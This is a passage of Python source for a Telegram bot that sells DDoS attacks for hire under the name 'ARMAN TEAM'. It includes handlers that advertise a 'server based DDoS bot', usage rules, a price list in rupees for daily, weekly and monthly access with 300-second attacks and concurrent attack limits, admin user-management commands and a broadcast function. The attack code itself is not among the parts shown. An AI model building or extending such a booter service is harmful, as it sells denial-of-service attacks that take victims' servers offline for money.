    response = f'''💐 𝙃𝙀𝙔 {username}  𝙒𝙀𝙇𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈. 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗛𝗜𝗚𝗛 𝗤𝗨𝗔𝗟𝗜𝗧𝗬 𝗦𝗘𝗥𝗩𝗘𝗥 𝗕𝗔𝗦𝗘𝗗 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐥𝐢𝐦𝐢𝐭~ 10𝐦𝐢𝐧𝐮𝐭𝐞𝐬 .
🤖𝗧𝗿𝘆 𝗧𝗼 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /help 
✅BUY :- @MR_ARMAN_OWNER'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->50Rs
Week-->250Rs
Month-->500 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝘼𝙇𝙀𝙍𝙏 ⚠️‼️\n𝙏𝙃𝙄𝙎 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏 𝙁𝙍𝙊𝙈 :--> 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 ✅:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


